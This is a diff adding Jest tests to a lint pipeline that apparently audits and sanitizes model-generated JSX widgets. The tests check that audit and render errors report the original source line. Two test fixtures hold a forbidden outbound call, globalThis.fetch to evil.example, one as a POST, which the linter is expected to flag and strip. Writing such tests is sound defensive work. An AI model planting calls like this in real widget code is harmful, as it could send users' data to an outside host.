@@ -48,6 +48,84 @@ describe("widget lint pipeline (gateway)", () => {
     expect(res.errors[0].message).toContain("boom render");
   });
 
+  test("audit findings carry a code frame at the ORIGINAL line (JSX above)", async () => {
+    // The stripped capability sits on source line 4 — after a multi-line
+    // JSX block that reflows during compile. The frame must point at 4.
+    const src = `export default function App() {
+  return (
+    <div className="gu-root">
+      {evil()}
+    </div>
+  );
+}
+
+function evil() {
+  globalThis.fetch("https://evil.example/x");
+}`;
+    const res = await runWidgetLint({ id: "t", source: src });
+    expect(res.ok).toBe(false);
+    const err = res.errors[0];
+    expect(err.phase).toBe("audit");
+    expect(err.line).toBe(10);
+    expect(err.message).toContain("10 |   globalThis.fetch");
+    expect(err.message).toContain("^");
+  });
+
+  test("frames stay correct after the sanitize stage (multi-line strip)", async () => {
+    // boom() first strips a MULTI-LINE forbidden call (the sanitize edits
+    // the module in place), then throws on a later line. The frame must
+    // still land on the throw's ORIGINAL line — this pins that the map
+    // survives the sanitize, not just the transpile.
+    const src = `export default function App() {
+  return (
+    <div className="gu-root">
+      <h1>{boom()}</h1>
+    </div>
+  );
+}
+
+function boom() {
+  globalThis.fetch(
+    "https://evil.example/x",
+    { method: "post" }
+  );
+  throw new Error("after strip");
+}`;
+    const res = await runWidgetLint({ id: "t", source: src });
+    const render = res.errors.find((e) => e.phase === "render");
+    expect(render).toBeTruthy();
+    expect(render!.message).toContain("after strip");
+    // The audit finding sits on the ORIGINAL line 10 (the multi-line call).
+    const audit = res.errors.find((e) => e.phase === "audit");
+    expect(audit?.line).toBe(10);
+  });
+
+  test("render errors carry a code frame of the model source", async () => {
+    const src = `export default function App() {
+  return (
+    <div className="gu-root">
+      <h1>{boom()}</h1>
+      <p>pad</p>
+    </div>
+  );
+}
+
+function boom() {
+  throw new Error("frame boom");
+}`;
+    const res = await runWidgetLint({ id: "t", source: src });
+    expect(res.ok).toBe(false);
+    const err = res.errors[0];
+    expect(err.phase).toBe("render");
+    expect(err.message).toContain("frame boom");
+    // The frame marks a real line of the model's source (the exact line
+    // depends on which frame the runtime stack tops out at — the mapping
+    // itself is pinned by the source-map unit tests).
+    expect(err.message).toMatch(/\n\d+ \| /);
+    expect(err.message).toContain("^");
+    expect(typeof err.line).toBe("number");
+  });
+
   test("an invalid state header fails the lint", async () => {
     const res = await runWidgetLint({ id: "t", source: goodWidget, state: "{bad json}" });
     expect(res.ok).toBe(false);
